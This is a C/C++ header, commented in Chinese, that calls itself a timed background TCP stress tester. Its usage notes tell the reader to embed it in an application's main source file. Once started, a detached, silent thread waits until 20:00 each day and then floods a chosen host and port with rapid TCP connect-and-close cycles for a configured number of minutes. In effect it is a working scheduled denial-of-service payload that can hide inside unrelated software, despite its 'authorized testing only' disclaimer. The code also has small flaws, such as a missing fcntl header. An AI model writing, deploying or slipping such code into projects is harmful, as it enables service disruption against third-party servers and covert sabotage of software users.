/*
 * stress_timer.h - 定时后台 TCP 压力测试
 *
 * 用法：
 *   1. 将此文件放入项目源码目录。
 *   2. 在 唯一一个 .cpp 文件（如 main.cpp）顶部 #include "stress_timer.h"
 *   3. 在 main() 开始时调用 start_background_stress("目标域名", 443, 4, 30);
 *   4. 编译时链接 pthread 库（-lpthread）。
 *
 * 注意：本工具仅为授权测试提供，滥用违法。
 */

#ifndef STRESS_TIMER_H
#define STRESS_TIMER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <atomic>

#ifdef __cplusplus
extern "C" {
#endif

/* ---------- 可配置参数 ---------- */
#define MONITOR_INTERVAL_SEC  30    // 监控线程检查间隔（秒）
#define CONNECT_TIMEOUT_SEC    2    // 单次 connect 超时（秒）

/* ---------- 全局状态 ---------- */
static std::atomic<bool> g_stop_workers{false};
static time_t            g_session_start = 0;
static int               g_session_duration = 0;
static pthread_mutex_t   g_mutex = PTHREAD_MUTEX_INITIALIZER;
static int               g_last_trigger_day = -1;   // 记录上次触发的日期（避免同一天重复触发）
static char              g_target_ip[64] = {0};     // 解析后的 IP
static int               g_target_port = 0;
static int               g_thread_count = 0;

/* ---------- 工具函数 ---------- */
// 简易日志（可替换为项目中的 LOGD/LOGE）
#ifndef LOG_TAG
#define LOG_TAG "StressTimer"
#endif
#define LOGI(fmt, ...) fprintf(stdout, "[%s] " fmt "\n", LOG_TAG, ##__VA_ARGS__)
#define LOGE(fmt, ...) fprintf(stderr, "[%s] " fmt "\n", LOG_TAG, ##__VA_ARGS__)

/* 域名解析为 IPv4 地址 */
static int resolve_host(const char *host, char *ip_out, size_t ip_len) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int ret = getaddrinfo(host, NULL, &hints, &res);
    if (ret != 0) {
        LOGE("getaddrinfo failed: %s", gai_strerror(ret));
        return -1;
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    inet_ntop(AF_INET, &addr->sin_addr, ip_out, ip_len);
    freeaddrinfo(res);
    return 0;
}

/* 单个工作线程：疯狂建立 TCP 连接然后立刻关闭 */
static void* worker_thread(void *arg) {
    (void)arg;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(g_target_port);
    inet_pton(AF_INET, g_target_ip, &addr.sin_addr);

    while (!g_stop_workers.load()) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            LOGE("socket() failed: %s", strerror(errno));
            continue;
        }

        // 允许本地端口重用，减少 TIME_WAIT 耗尽
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        // 设置非阻塞 connect，以便超时控制
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        int ret = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        if (ret < 0 && errno != EINPROGRESS) {
            // 连接立即失败，跳过
            close(sock);
            continue;
        }

        // 使用 select 等待连接完成或超时
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(sock, &wfds);
        struct timeval tv = {CONNECT_TIMEOUT_SEC, 0};

        ret = select(sock + 1, NULL, &wfds, NULL, &tv);
        if (ret <= 0) {
            // 超时或错误
            close(sock);
            continue;
        }

        // 检查是否真的连接成功（可选）
        int error = 0;
        socklen_t len = sizeof(error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len);
        if (error != 0) {
            close(sock);
            continue;
        }

        // 连接成功，立即关闭（也可以发送一点数据，这里仅消耗连接资源）
        close(sock);
    }
    return NULL;
}

/* 启动一次压力会话（阻塞直到持续时长结束） */
static void run_stress_session(int threads, int duration_sec) {
    if (threads <= 0) threads = 1;
    if (duration_sec <= 0) duration_sec = 1800;

    LOGI("压力测试启动：目标 %s:%d，线程数 %d，持续 %d 秒",
         g_target_ip, g_target_port, threads, duration_sec);

    g_stop_workers.store(false);
    pthread_t *tids = (pthread_t*)calloc(threads, sizeof(pthread_t));
    if (!tids) {
        LOGE("内存分配失败");
        return;
    }

    for (int i = 0; i < threads; i++) {
        pthread_create(&tids[i], NULL, worker_thread, NULL);
    }

    // 等待指定时长
    sleep(duration_sec);

    // 停止所有工作线程
    g_stop_workers.store(true);
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }
    free(tids);

    LOGI("压力测试结束");
}

/* 监控线程主函数：循环检查时间，在 20:00 触发 */
static void* monitor_thread(void *arg) {
    (void)arg;
    LOGI("后台压力监控已启动，目标 %s:%d，线程数 %d，持续 %d 分钟",
         g_target_ip, g_target_port, g_thread_count, g_session_duration / 60);

    while (1) {
        sleep(MONITOR_INTERVAL_SEC);

        time_t now = time(NULL);
        struct tm tm_now;
        localtime_r(&now, &tm_now);

        // 判断是否到达 20:00（整点附近，当天只触发一次）
        if (tm_now.tm_hour == 20 && g_last_trigger_day != tm_now.tm_yday) {
            g_last_trigger_day = tm_now.tm_yday;   // 标记今天已触发
            LOGI("检测到 20:00，开始压力测试...");

            // 执行压力会话（阻塞式，结束后继续循环）
            run_stress_session(g_thread_count, g_session_duration);
            LOGI("今日压力测试已完成，等待下一天 20:00");
        }
    }
    return NULL;
}

/* ---------- 对外接口 ---------- */
/*
 * 启动后台压力监控。
 * 参数：
 *   host            - 目标域名（如 "example.com"）
 *   port            - 目标端口（如 443）
 *   threads         - 工作线程数（如 4）
 *   duration_min    - 每次压测持续分钟数（如 30）
 *
 * 该函数会解析域名，并创建一个分离的后台线程进行时间监听。
 * 调用后即可返回，不影响主程序后续逻辑。
 */
static inline void start_background_stress(const char *host,
                                           int port,
                                           int threads,
                                           int duration_min) {
    if (!host || port <= 0 || threads <= 0 || duration_min <= 0) {
        LOGE("参数无效");
        return;
    }

    // 解析域名
    if (resolve_host(host, g_target_ip, sizeof(g_target_ip)) != 0) {
        LOGE("域名解析失败，无法启动压力监控");
        return;
    }

    g_target_port = port;
    g_thread_count = threads;
    g_session_duration = duration_min * 60;

    pthread_t tid;
    pthread_attr_t attr;

    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&tid, &attr, monitor_thread, NULL) != 0) {
        LOGE("创建监控线程失败");
    }
    pthread_attr_destroy(&attr);
}

#ifdef __cplusplus
}
#endif

#endif /* STRESS_TIMER_H */